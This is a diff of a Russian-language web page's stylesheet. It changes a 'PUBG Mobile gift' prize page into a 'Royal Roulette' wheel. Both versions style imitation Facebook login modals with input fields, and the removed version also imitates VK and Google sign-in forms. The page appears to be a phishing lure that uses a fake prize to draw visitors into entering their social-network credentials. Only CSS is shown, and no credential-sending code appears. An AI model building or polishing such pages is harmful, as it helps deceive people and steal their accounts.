@@ -2,212 +2,162 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Подарок PUBG Mobile</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Royal Roulette</title>
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            -webkit-tap-highlight-color: transparent;
+            font-family: Arial, sans-serif;
         }
-        
+
         body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            background: linear-gradient(180deg, #0a0a0a 0%, #1a1a2e 100%);
+            background: #000;
             color: white;
             min-height: 100vh;
+            position: relative;
             overflow-x: hidden;
-            background-attachment: fixed;
-            position: relative;
+            overflow-y: auto;
         }
-        
-        .container {
-            max-width: 500px;
-            margin: 0 auto;
-            padding: 0;
-            position: relative;
-            min-height: 100vh;
-            background: linear-gradient(180deg, #0a0a0a 0%, #1a1a2e 100%);
-            overflow: hidden;
-        }
-        
-        /* Контент */
-        .content {
-            padding: 20px;
-            position: relative;
-            animation: fadeIn 0.8s ease-out;
-        }
-        
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(20px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-        
-        .game-section {
-            background: rgba(30, 30, 46, 0.8);
-            border-radius: 20px;
-            padding: 25px;
-            margin-bottom: 20px;
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.4);
-            backdrop-filter: blur(10px);
-            animation: slideUp 0.6s ease-out 0.2s both;
-        }
-        
-        @keyframes slideUp {
-            from { opacity: 0; transform: translateY(40px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-        
-        .prize-display {
-            background: rgba(40, 40, 60, 0.6);
-            border-radius: 20px;
-            padding: 30px 20px;
-            text-align: center;
-            margin: 20px 0;
-            border: 1px solid rgba(255, 255, 255, 0.05);
-            min-height: 320px;
+
+        .backgrounds-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -2;
             display: flex;
             flex-direction: column;
-            justify-content: center;
-            align-items: center;
+        }
+
+        .background-top {
+            flex: 1;
+            background-image: url('phon.png');
+            background-size: cover;
+            background-position: center;
+            min-height: 50vh;
             position: relative;
-            overflow: hidden;
-            animation: pulseGlow 2s infinite alternate;
         }
-        
-        @keyframes pulseGlow {
-            0% { box-shadow: 0 0 20px rgba(255, 56, 56, 0.1); }
-            100% { box-shadow: 0 0 40px rgba(255, 56, 56, 0.3); }
-        }
-        
-        /* Анимированная рулетка */
-        .slot-machine {
-            width: 180px;
-            height: 180px;
-            background: linear-gradient(145deg, #2d2d44, #1a1a2e);
-            border-radius: 25px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin: 0 auto 20px;
+
+        .background-bottom {
+            flex: 1;
+            background-image: url('phon2.png');
+            background-size: cover;
+            background-position: center;
+            min-height: 50vh;
             position: relative;
-            overflow: hidden;
-            box-shadow: 
-                0 10px 30px rgba(255, 56, 56, 0.4),
-                inset 0 4px 12px rgba(255, 56, 56, 0.3),
-                inset 0 -4px 12px rgba(0, 0, 0, 0.6);
-            border: 3px solid #ff3838;
-            animation: float 3s ease-in-out infinite;
         }
-        
-        @keyframes float {
-            0%, 100% { transform: translateY(0px); }
-            50% { transform: translateY(-10px); }
-        }
-        
-        .slot-machine::before {
-            content: '';
+
+        .gradient-overlay {
             position: absolute;
-            width: 200%;
-            height: 200%;
-            background: conic-gradient(
-                transparent, 
-                rgba(255, 56, 56, 0.8),
-                transparent 30%
-            );
-            animation: rotate 3s linear infinite;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(to bottom, 
+                transparent 0%, 
+                rgba(0, 0, 0, 0.3) 30%, 
+                rgba(0, 0, 0, 0.7) 70%, 
+                transparent 100%);
             z-index: 1;
         }
-        
-        @keyframes rotate {
-            from { transform: rotate(0deg); }
-            to { transform: rotate(360deg); }
-        }
-        
-        .slot-machine-inner {
-            font-size: 80px;
-            z-index: 2;
-            position: relative;
-            background: linear-gradient(45deg, #FFD700, #ff9d00);
-            -webkit-background-clip: text;
-            background-clip: text;
-            -webkit-text-fill-color: transparent;
-            animation: bounce 2s infinite;
-        }
-        
-        @keyframes bounce {
-            0%, 100% { transform: scale(1); }
-            50% { transform: scale(1.1); }
-        }
-        
-        .prize-name-large {
-            font-size: 28px;
-            background: linear-gradient(45deg, #FFD700, #ff9d00);
-            -webkit-background-clip: text;
-            background-clip: text;
-            -webkit-text-fill-color: transparent;
-            font-weight: bold;
-            margin-bottom: 10px;
-            animation: textGlow 2s infinite alternate;
-        }
-        
-        @keyframes textGlow {
-            0% { text-shadow: 0 0 10px rgba(255, 215, 0, 0.3); }
-            100% { text-shadow: 0 0 20px rgba(255, 215, 0, 0.6); }
-        }
-        
-        .prize-subtitle {
-            color: rgba(255, 255, 255, 0.8);
-            font-size: 16px;
-            animation: fadeInUp 0.8s ease-out 0.4s both;
-        }
-        
-        @keyframes fadeInUp {
-            from { opacity: 0; transform: translateY(10px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-        
-        .spin-button {
-            background: linear-gradient(45deg, #ff3838, #ff6b6b);
-            color: white;
-            border: none;
-            border-radius: 15px;
-            padding: 20px;
-            font-size: 20px;
-            font-weight: bold;
+
+        .container {
             width: 100%;
-            cursor: pointer;
-            transition: all 0.3s;
-            margin: 20px 0;
+            max-width: 100%;
+            margin: 0;
+            padding: 40px 20px;
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            z-index: 1;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: flex-end;
+            height: auto;
+            transition: all 0.5s ease;
+        }
+
+        .roulette-container {
+            position: relative;
+            width: 350px;
+            height: 350px;
+            margin: 0 auto 25px;
+            pointer-events: none;
+            user-select: none;
+            -webkit-user-drag: none;
+        }
+
+        .wheel-container {
+            position: relative;
+            width: 100%;
+            height: 100%;
             display: flex;
             align-items: center;
             justify-content: center;
-            gap: 10px;
+        }
+
+        .wheel {
+            position: absolute;
+            transition: transform 3s cubic-bezier(0.17, 0.67, 0.83, 0.67);
+            transform-origin: center;
+        }
+
+        .prize-wheel {
+            width: 100%;
+            height: 100%;
+            z-index: 1;
+        }
+
+        .wheel-base {
+            width: 55%;
+            height: 55%;
+            z-index: 2;
+            filter: brightness(1.2);
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            object-fit: contain;
+            pointer-events: none;
+            transition: transform 3s cubic-bezier(0.17, 0.67, 0.83, 0.67);
+        }
+
+        .spin-button {
+            display: block;
+            margin: 25px auto;
+            padding: 15px 50px;
+            font-size: 1.5rem;
+            font-weight: bold;
+            color: black;
+            background: linear-gradient(45deg, gold, #ffd700);
+            border: none;
+            border-radius: 50px;
+            cursor: pointer;
+            transition: all 0.3s;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            box-shadow: 0 0 20px rgba(255, 215, 0, 0.7);
             position: relative;
             overflow: hidden;
-            animation: buttonPulse 2s infinite;
+            z-index: 3;
+            pointer-events: auto;
         }
-        
-        @keyframes buttonPulse {
-            0%, 100% { transform: scale(1); }
-            50% { transform: scale(1.02); }
-        }
-        
+
         .spin-button:hover {
-            transform: translateY(-5px);
-            box-shadow: 0 10px 25px rgba(255, 56, 56, 0.5);
+            transform: scale(1.05);
+            box-shadow: 0 0 30px rgba(255, 215, 0, 1);
+            background: linear-gradient(45deg, #ffd700, gold);
         }
-        
+
         .spin-button:disabled {
-            background: linear-gradient(45deg, #666, #888);
+            opacity: 0.5;
             cursor: not-allowed;
-            transform: none !important;
-            animation: none;
+            transform: none;
         }
-        
+
         .spin-button::before {
             content: '';
             position: absolute;
@@ -215,1775 +165,1070 @@
             left: -50%;
             width: 200%;
             height: 200%;
-            background: linear-gradient(
-                45deg,
-                transparent,
-                rgba(255, 255, 255, 0.1),
-                transparent
-            );
+            background: linear-gradient(45deg, transparent, rgba(255, 255, 255, 0.3), transparent);
             transform: rotate(45deg);
-            animation: shine 3s infinite;
+            transition: all 0.5s;
         }
-        
-        @keyframes shine {
-            0% { transform: translateX(-100%) translateY(-100%) rotate(45deg); }
-            100% { transform: translateX(100%) translateY(100%) rotate(45deg); }
-        }
-        
-        /* Правая секция - ТВОЙ ВЫИГРЫШ */
-        .result-section {
-            background: rgba(30, 30, 46, 0.8);
-            border-radius: 20px;
-            padding: 25px;
-            margin-bottom: 20px;
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.4);
-            backdrop-filter: blur(10px);
-            animation: slideUp 0.6s ease-out 0.4s both;
-        }
-        
-        .section-title {
-            text-align: center;
-            font-size: 22px;
-            font-weight: bold;
-            margin-bottom: 25px;
-            color: white;
-            position: relative;
-            display: inline-block;
-            left: 50%;
-            transform: translateX(-50%);
-        }
-        
-        .section-title::after {
-            content: '';
-            position: absolute;
-            bottom: -8px;
-            left: 25%;
-            width: 50%;
-            height: 3px;
-            background: linear-gradient(90deg, transparent, #ff3838, transparent);
-            animation: widthPulse 2s infinite;
-        }
-        
-        @keyframes widthPulse {
-            0%, 100% { width: 50%; }
-            50% { width: 60%; }
-        }
-        
-        .winner-info {
-            background: rgba(40, 40, 60, 0.6);
-            border-radius: 15px;
-            padding: 25px;
-            margin-bottom: 20px;
-            text-align: center;
-            animation: fadeIn 0.8s ease-out;
-        }
-        
-        .win-message {
-            font-size: 22px;
-            color: #00b894;
-            font-weight: bold;
-            margin-bottom: 15px;
-            animation: colorShift 3s infinite alternate;
-        }
-        
-        @keyframes colorShift {
-            0% { color: #00b894; }
-            100% { color: #00ffd0; }
-        }
-        
-        .winner-prize {
-            font-size: 20px;
-            color: #FFD700;
-            font-weight: bold;
-            margin-bottom: 15px;
-            animation: goldShine 2s infinite alternate;
-        }
-        
-        @keyframes goldShine {
-            0% { text-shadow: 0 0 10px rgba(255, 215, 0, 0.5); }
-            100% { text-shadow: 0 0 20px rgba(255, 215, 0, 0.8); }
-        }
-        
-        .winner-desc {
-            color: rgba(255, 255, 255, 0.8);
-            font-size: 15px;
-            margin-bottom: 20px;
-            line-height: 1.5;
-        }
-        
-        .social-choice-btn {
-            background: linear-gradient(45deg, #666, #888);
-            color: white;
-            border: none;
-            border-radius: 15px;
-            padding: 18px;
-            font-size: 18px;
-            font-weight: bold;
-            width: 100%;
-            cursor: pointer;
-            transition: all 0.3s;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-            margin-top: 20px;
-            position: relative;
-            overflow: hidden;
-        }
-        
-        .social-choice-btn:hover {
-            transform: translateY(-3px);
-            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.4);
-        }
-        
-        .social-choice-btn::after {
-            content: '';
-            position: absolute;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(90deg, 
-                transparent, 
-                rgba(255, 255, 255, 0.1), 
-                transparent);
-            top: 0;
-            left: -100%;
-            transition: left 0.5s;
-        }
-        
-        .social-choice-btn:hover::after {
+
+        .spin-button:hover::before {
             left: 100%;
         }
-        
-        /* Призы */
-        .prizes-showcase {
-            background: rgba(30, 30, 46, 0.8);
-            border-radius: 20px;
-            padding: 25px;
-            margin-bottom: 20px;
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.4);
-            backdrop-filter: blur(10px);
-            animation: slideUp 0.6s ease-out 0.6s both;
-        }
-        
-        .prizes-grid {
-            display: grid;
-            grid-template-columns: repeat(3, 1fr);
-            gap: 15px;
-            margin-top: 20px;
-        }
-        
-        .prize-item {
-            background: rgba(40, 40, 60, 0.6);
-            border-radius: 15px;
-            padding: 20px 15px;
-            text-align: center;
-            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-            border: 1px solid transparent;
-            position: relative;
-            overflow: hidden;
-            animation: itemAppear 0.5s ease-out;
-        }
-        
-        @keyframes itemAppear {
-            from { opacity: 0; transform: scale(0.8); }
-            to { opacity: 1; transform: scale(1); }
-        }
-        
-        .prize-item:hover {
-            border-color: #ff3838;
-            transform: translateY(-8px) scale(1.05);
-            box-shadow: 0 10px 25px rgba(255, 56, 56, 0.3);
-        }
-        
-        .prize-item::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            right: 0;
-            height: 3px;
-            background: linear-gradient(90deg, #ff3838, #FFD700, #ff3838);
-            background-size: 200% 100%;
-            animation: shimmer 2s infinite linear;
-        }
-        
-        @keyframes shimmer {
-            0% { background-position: -200% 0; }
-            100% { background-position: 200% 0; }
-        }
-        
-        .prize-item img {
-            width: 70px;
-            height: 70px;
-            object-fit: contain;
-            margin-bottom: 10px;
-            filter: drop-shadow(0 4px 8px rgba(255, 215, 0, 0.5));
-            transition: all 0.3s;
-        }
-        
-        .prize-item:hover img {
-            transform: rotate(5deg) scale(1.1);
-            filter: drop-shadow(0 6px 12px rgba(255, 215, 0, 0.7));
-        }
-        
-        .prize-item-name {
-            font-size: 14px;
-            font-weight: 600;
-            color: #FFD700;
-            transition: all 0.3s;
-        }
-        
-        .prize-item:hover .prize-item-name {
-            color: #ff9d00;
-        }
-        
-        /* Инструкции */
-        .instructions {
-            background: rgba(255, 193, 7, 0.1);
-            border-radius: 15px;
-            padding: 25px;
-            margin-top: 20px;
-            border: 1px solid rgba(255, 193, 7, 0.2);
-            animation: fadeIn 0.8s ease-out 0.8s both;
-        }
-        
-        .instructions h3 {
-            color: #ffc107;
-            margin-bottom: 20px;
-            font-size: 18px;
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            animation: slideInLeft 0.6s ease-out;
-        }
-        
-        @keyframes slideInLeft {
-            from { opacity: 0; transform: translateX(-20px); }
-            to { opacity: 1; transform: translateX(0); }
-        }
-        
-        .instructions ul {
-            list-style: none;
-            padding-left: 0;
-        }
-        
-        .instructions li {
-            margin-bottom: 15px;
-            padding-left: 30px;
-            position: relative;
-            font-size: 14px;
-            line-height: 1.5;
-            opacity: 0;
-            animation: listItemAppear 0.4s ease-out forwards;
-        }
-        
-        .instructions li:nth-child(1) { animation-delay: 0.9s; }
-        .instructions li:nth-child(2) { animation-delay: 1.0s; }
-        .instructions li:nth-child(3) { animation-delay: 1.1s; }
-        .instructions li:nth-child(4) { animation-delay: 1.2s; }
-        .instructions li:nth-child(5) { animation-delay: 1.3s; }
-        .instructions li:nth-child(6) { animation-delay: 1.4s; }
-        
-        @keyframes listItemAppear {
-            to { opacity: 1; transform: translateY(0); }
-            from { opacity: 0; transform: translateY(10px); }
-        }
-        
-        .instructions li:before {
-            content: "✓";
-            position: absolute;
-            left: 0;
-            color: #00b894;
-            font-weight: bold;
-            font-size: 16px;
-            animation: checkPulse 2s infinite;
-        }
-        
-        @keyframes checkPulse {
-            0%, 100% { transform: scale(1); }
-            50% { transform: scale(1.2); }
-        }
-        
-        /* Анимация выигрыша */
-        .won-prize-animation {
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            font-size: 100px;
-            z-index: 100;
-            animation: prizeReveal 1.5s ease-out forwards;
-            opacity: 0;
-        }
-        
-        @keyframes prizeReveal {
-            0% { 
-                opacity: 0; 
-                transform: translate(-50%, -50%) scale(0.1) rotate(-180deg); 
-            }
-            50% { 
-                opacity: 1; 
-                transform: translate(-50%, -50%) scale(1.2) rotate(0deg); 
-            }
-            100% { 
-                opacity: 1; 
-                transform: translate(-50%, -50%) scale(1) rotate(0deg); 
-            }
-        }
-        
-        .confetti {
-            position: fixed;
-            width: 10px;
-            height: 10px;
-            background: #ff3838;
-            top: -10px;
-            z-index: 999;
-            animation: confettiFall 5s linear forwards;
-        }
-        
-        .confetti:nth-child(odd) { background: #FFD700; }
-        .confetti:nth-child(2n) { background: #00b894; }
-        .confetti:nth-child(3n) { background: #1877F2; }
-        .confetti:nth-child(4n) { background: #9b59b6; }
-        
-        @keyframes confettiFall {
-            0% { 
-                transform: translateY(0) rotate(0deg); 
-                opacity: 1; 
-            }
-            100% { 
-                transform: translateY(100vh) rotate(720deg); 
-                opacity: 0; 
-            }
-        }
-        
-        /* Защита данных текст */
-        .data-protection {
-            text-align: center;
-            color: rgba(255, 255, 255, 0.5);
-            font-size: 12px;
-            padding: 20px;
-            margin-top: 10px;
-            animation: fadeIn 1s ease-out 1.5s both;
-        }
-        
+
         /* Модальные окна */
         .modal-overlay {
-            display: none;
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
             background: rgba(0, 0, 0, 0.95);
-            z-index: 10000;
+            display: none;
             justify-content: center;
             align-items: center;
+            z-index: 1000;
+            animation: fadeIn 0.3s ease;
+            overflow-y: auto;
             padding: 20px;
-            animation: modalFadeIn 0.3s ease-out;
-            backdrop-filter: blur(10px);
         }
-        
-        @keyframes modalFadeIn {
-            from { opacity: 0; backdrop-filter: blur(0px); }
-            to { opacity: 1; backdrop-filter: blur(10px); }
-        }
-        
-        /* Facebook модалка */
-        .facebook-original {
-            background: #fff;
-            border-radius: 8px;
-            overflow: hidden;
+
+        .modal-content {
+            background: #000;
+            border-radius: 10px;
+            padding: 0;
             width: 100%;
-            max-width: 500px;
-            box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
-            animation: modalSlideIn 0.4s ease-out;
-        }
-        
-        @keyframes modalSlideIn {
-            0% { transform: translateY(30px); opacity: 0; }
-            100% { transform: translateY(0); opacity: 1; }
-        }
-        
-        .fb-header {
-            background: #fff;
-            padding: 30px 20px;
+            max-width: 400px;
+            min-height: 600px;
             text-align: center;
-            border-bottom: 1px solid #dadde1;
+            position: relative;
+            overflow: hidden;
+            border: 2px solid #333;
+            box-shadow: 0 0 30px rgba(0, 0, 0, 0.8);
         }
-        
-        .fb-logo {
-            color: #1877f2;
-            font-size: 42px;
-            font-weight: bold;
-            margin-bottom: 20px;
-            letter-spacing: -1px;
-            font-family: Arial, sans-serif;
+
+        /* Стили для окна выигрыша */
+        .win-modal-header {
+            background: linear-gradient(135deg, #1a1a1a 0%, #333 100%);
+            padding: 25px 20px;
+            border-bottom: 2px solid gold;
         }
-        
-        .fb-title {
-            color: #1c1e21;
-            font-size: 20px;
-            font-weight: normal;
-            margin: 0;
-            line-height: 1.34;
-        }
-        
-        .fb-body {
-            padding: 25px;
-            background: #fff;
-        }
-        
-        .fb-form-group {
-            margin-bottom: 20px;
-        }
-        
-        .fb-input {
-            width: 100%;
-            padding: 16px;
-            border: 1px solid #dddfe2;
-            border-radius: 6px;
-            font-size: 17px;
-            color: #1d2129;
-            background: #fff;
-            font-family: Helvetica, Arial, sans-serif;
-        }
-        
-        .fb-input:focus {
-            border-color: #1877f2;
-            box-shadow: 0 0 0 2px #e7f3ff;
-            outline: none;
-        }
-        
-        .fb-submit {
-            width: 100%;
-            padding: 16px;
-            background: #1877f2;
+
+        .win-modal-header h1 {
             color: #fff;
-            border: none;
-            border-radius: 6px;
-            font-size: 20px;
-            font-weight: bold;
-            cursor: pointer;
-            font-family: Helvetica, Arial, sans-serif;
-            transition: background 0.3s;
-        }
-        
-        .fb-submit:hover {
-            background: #166fe5;
-        }
-        
-        .fb-footer {
-            background: #fff;
-            padding: 20px 16px;
-            text-align: center;
-            border-top: 1px solid #dadde1;
-            font-family: Helvetica, Arial, sans-serif;
-        }
-        
-        .fb-links {
-            display: flex;
-            justify-content: center;
-            flex-wrap: wrap;
-            gap: 20px;
-            margin-bottom: 16px;
-        }
-        
-        .fb-link {
-            color: #8a8d91;
-            text-decoration: none;
-            font-size: 12px;
-            font-family: Helvetica, Arial, sans-serif;
-        }
-        
-        .fb-meta {
-            color: #8a8d91;
-            font-size: 11px;
-            font-family: Helvetica, Arial, sans-serif;
-            line-height: 1.34;
-        }
-        
-        /* VK модалка */
-        .vk-original {
-            background: #fff;
-            border-radius: 8px;
-            overflow: hidden;
-            width: 100%;
-            max-width: 500px;
-            box-shadow: 0 0 20px rgba(0, 0, 0, 0.1);
-        }
-        
-        .vk-header {
-            background: #5181b8;
-            padding: 30px 20px;
-            text-align: center;
-            color: white;
-            font-family: -apple-system, BlinkMacSystemFont, 'Roboto', sans-serif;
-        }
-        
-        .vk-logo {
-            font-size: 34px;
-            font-weight: 700;
-            margin-bottom: 15px;
-            letter-spacing: -0.5px;
-        }
-        
-        .vk-title {
-            font-size: 18px;
-            opacity: 0.9;
-            font-weight: 400;
-        }
-        
-        .vk-body {
-            padding: 35px 40px;
-            background: #fafbfc;
-            font-family: -apple-system, BlinkMacSystemFont, 'Roboto', sans-serif;
-        }
-        
-        .vk-form-group {
-            margin-bottom: 25px;
-        }
-        
-        .vk-input {
-            width: 100%;
-            padding: 16px;
-            border: 1px solid #dce1e6;
-            border-radius: 4px;
-            font-size: 16px;
-            color: #000;
-            background: #fff;
-        }
-        
-        .vk-input:focus {
-            border-color: #5181b8;
-            outline: none;
-            box-shadow: 0 0 0 2px rgba(81, 129, 184, 0.2);
-        }
-        
-        .vk-submit {
-            width: 100%;
-            padding: 16px;
-            background: #5181b8;
-            color: #fff;
-            border: none;
-            border-radius: 4px;
-            font-size: 18px;
-            font-weight: 500;
-            cursor: pointer;
-            transition: background 0.3s;
-        }
-        
-        .vk-submit:hover {
-            background: #5b88bd;
-        }
-        
-        .vk-footer {
-            padding: 25px;
-            background: #fff;
-            border-top: 1px solid #e7e8ec;
-            text-align: center;
-            font-family: -apple-system, BlinkMacSystemFont, 'Roboto', sans-serif;
-        }
-        
-        .vk-link {
-            color: #2a5885;
-            text-decoration: none;
-            font-size: 14px;
-            margin: 0 15px;
-        }
-        
-        /* Google модалка */
-        .google-original {
-            background: #fff;
-            border-radius: 8px;
-            overflow: hidden;
-            width: 100%;
-            max-width: 500px;
-            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
-        }
-        
-        .google-header {
-            padding: 45px 40px 25px;
-            text-align: center;
-            font-family: 'Google Sans', 'Roboto', sans-serif;
-        }
-        
-        .google-logo {
-            width: 85px;
-            height: 28px;
-            margin-bottom: 25px;
-            background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 75 24"><path fill="%234285F4" d="M10 12c0-1.66 1.34-3 3-3s3 1.34 3 3-1.34 3-3 3-3-1.34-3-3z"/><path fill="%23EA4335" d="M26 12c0-1.66 1.34-3 3-3s3 1.34 3 3-1.34 3-3 3-3-1.34-3-3z"/><path fill="%23FBBC05" d="M42 12c0-1.66 1.34-3 3-3s3 1.34 3 3-1.34 3-3 3-3-1.34-3-3z"/><path fill="%2334A853" d="M58 12c0-1.66 1.34-3 3-3s3 1.34 3 3-1.34 3-3 3-3-1.34-3-3z"/></svg>');
-            margin: 0 auto;
-        }
-        
-        .google-title {
-            font-size: 26px;
-            color: #202124;
-            font-weight: 400;
+            font-size: 2.5rem;
             margin-bottom: 10px;
+            text-transform: uppercase;
+            font-weight: bold;
+            letter-spacing: 3px;
         }
-        
-        .google-subtitle {
-            font-size: 18px;
-            color: #5f6368;
-            font-weight: 400;
+
+        .win-modal-header h2 {
+            color: gold;
+            font-size: 1.8rem;
+            margin-bottom: 5px;
+            font-weight: normal;
         }
-        
-        .google-body {
-            padding: 0 40px 40px;
-            font-family: 'Roboto', sans-serif;
+
+        .win-modal-header h3 {
+            color: #ccc;
+            font-size: 1.2rem;
+            font-weight: normal;
+            margin-top: 15px;
         }
-        
-        .google-form-group {
-            margin-bottom: 25px;
-        }
-        
-        .google-input {
+
+        .prize-image-container {
             width: 100%;
-            padding: 16px;
-            border: 1px solid #dadce0;
-            border-radius: 4px;
-            font-size: 16px;
-            color: #202124;
-            background: #fff;
+            padding: 30px;
+            background: #111;
         }
-        
-        .google-input:focus {
-            border-color: #1a73e8;
-            outline: none;
-            box-shadow: 0 0 0 2px rgba(26, 115, 232, 0.2);
-        }
-        
-        .google-submit {
+
+        .prize-image {
+            max-width: 200px;
+            max-height: 200px;
             width: 100%;
-            padding: 16px;
-            background: #1a73e8;
+            height: auto;
+            border-radius: 10px;
+            border: 3px solid gold;
+            box-shadow: 0 0 20px rgba(255, 215, 0, 0.3);
+        }
+
+        .login-options {
+            padding: 25px 20px;
+            background: #222;
+        }
+
+        .login-options h3 {
             color: #fff;
-            border: none;
-            border-radius: 4px;
-            font-size: 16px;
-            font-weight: 500;
-            cursor: pointer;
-            transition: background 0.3s;
-        }
-        
-        .google-submit:hover {
-            background: #2b7de9;
-        }
-        
-        .google-footer {
-            padding: 25px 40px;
-            background: #f8f9fa;
-            border-top: 1px solid #dadce0;
-            display: flex;
-            justify-content: space-between;
-            font-family: 'Roboto', sans-serif;
-            font-size: 14px;
-        }
-        
-        .google-link {
-            color: #1a73e8;
-            text-decoration: none;
-        }
-        
-        /* Выбор соцсети */
-        .social-options {
-            display: grid;
-            grid-template-columns: repeat(3, 1fr);
-            gap: 15px;
             margin-bottom: 25px;
+            font-size: 1.4rem;
         }
-        
-        .social-option {
-            background: #fff;
-            border: 2px solid #e4e6eb;
-            border-radius: 12px;
-            padding: 20px 15px;
-            text-align: center;
+
+        .checkbox-option {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 15px;
+            background: #333;
+            border-radius: 8px;
+            margin-bottom: 15px;
+            cursor: pointer;
+            transition: all 0.3s;
+            border: 2px solid transparent;
+        }
+
+        .checkbox-option:hover {
+            background: #444;
+            border-color: #555;
+        }
+
+        .checkbox-option.active {
+            background: #444;
+            border-color: gold;
+        }
+
+        .checkbox-option span {
+            color: #fff;
+            font-size: 1.1rem;
+            font-weight: bold;
+        }
+
+        .checkbox-icon {
+            width: 24px;
+            height: 24px;
+            border-radius: 50%;
+            border: 2px solid #666;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: all 0.3s;
+        }
+
+        .checkbox-option.active .checkbox-icon {
+            background: gold;
+            border-color: gold;
+        }
+
+        .checkbox-option.active .checkbox-icon::after {
+            content: '✓';
+            color: #000;
+            font-weight: bold;
+        }
+
+        .modal-buttons {
+            padding: 20px;
+            background: #111;
+            display: flex;
+            gap: 15px;
+            border-top: 1px solid #333;
+        }
+
+        .modal-button {
+            flex: 1;
+            padding: 15px;
+            border: none;
+            border-radius: 8px;
+            font-size: 1.1rem;
+            font-weight: bold;
             cursor: pointer;
             transition: all 0.3s;
         }
-        
-        .social-option:hover {
-            border-color: #1877f2;
-            transform: translateY(-3px);
+
+        .modal-button.cancel {
+            background: #333;
+            color: #ccc;
         }
-        
-        .social-option.active {
-            border-color: #1877f2;
-            background: #f0f2f5;
+
+        .modal-button.ok {
+            background: gold;
+            color: #000;
         }
-        
-        .social-icon {
-            font-size: 32px;
+
+        .modal-button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+        }
+
+        /* Стили для Facebook окна */
+        .facebook-modal-content {
+            background: #fff;
+            color: #000;
+            min-height: 700px;
+        }
+
+        .facebook-header {
+            background: #1877f2;
+            padding: 20px;
+            text-align: center;
+        }
+
+        .facebook-logo {
+            color: white;
+            font-size: 2.5rem;
+            font-weight: bold;
             margin-bottom: 10px;
         }
-        
-        .social-name {
-            color: #1c1e21;
-            font-weight: 600;
-            font-size: 14px;
+
+        .facebook-subtitle {
+            color: rgba(255, 255, 255, 0.9);
+            font-size: 1.1rem;
         }
-        
-        .social-facebook .social-icon {
-            color: #1877f2;
+
+        .facebook-form {
+            padding: 30px 20px;
         }
-        
-        .social-vk .social-icon {
-            color: #5181b8;
-        }
-        
-        .social-google .social-icon {
-            color: #4285f4;
-        }
-        
-        /* Успешное модальное окно */
-        .success-modal {
-            background: white;
-            border-radius: 15px;
-            max-width: 500px;
+
+        .facebook-input {
             width: 100%;
-            overflow: hidden;
-            text-align: center;
-            animation: modalSlideIn 0.5s ease-out;
+            padding: 15px;
+            margin-bottom: 15px;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            font-size: 1rem;
         }
-        
-        .success-icon {
-            font-size: 70px;
-            color: #00b894;
-            margin: 40px 0 20px;
-            animation: successBounce 1s ease-out;
+
+        .facebook-input:focus {
+            outline: none;
+            border-color: #1877f2;
+            box-shadow: 0 0 0 2px rgba(24, 119, 242, 0.2);
         }
-        
-        @keyframes successBounce {
-            0%, 20%, 50%, 80%, 100% {transform: translateY(0);}
-            40% {transform: translateY(-30px);}
-            60% {transform: translateY(-15px);}
-        }
-        
-        .success-title {
-            color: #1c1e21;
-            font-size: 26px;
+
+        .facebook-login-button {
+            width: 100%;
+            padding: 15px;
+            background: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 1.1rem;
             font-weight: bold;
+            cursor: pointer;
             margin-bottom: 20px;
-            padding: 0 25px;
         }
-        
-        .prize-code {
-            background: #f0f2f5;
-            padding: 25px;
-            margin: 25px;
-            border-radius: 12px;
-            border: 2px dashed #00b894;
-            animation: pulse 2s infinite;
+
+        .facebook-divider {
+            text-align: center;
+            margin: 20px 0;
+            color: #666;
+            position: relative;
         }
-        
-        @keyframes pulse {
-            0% { border-color: #00b894; }
-            50% { border-color: #00ffd0; }
-            100% { border-color: #00b894; }
-        }
-        
-        .code {
-            font-size: 28px;
-            color: #1877f2;
-            font-weight: bold;
-            font-family: 'Courier New', monospace;
-            letter-spacing: 2px;
-            margin: 15px 0;
-            word-break: break-all;
-            animation: codeGlow 2s infinite alternate;
-        }
-        
-        @keyframes codeGlow {
-            0% { text-shadow: 0 0 5px rgba(24, 119, 242, 0.3); }
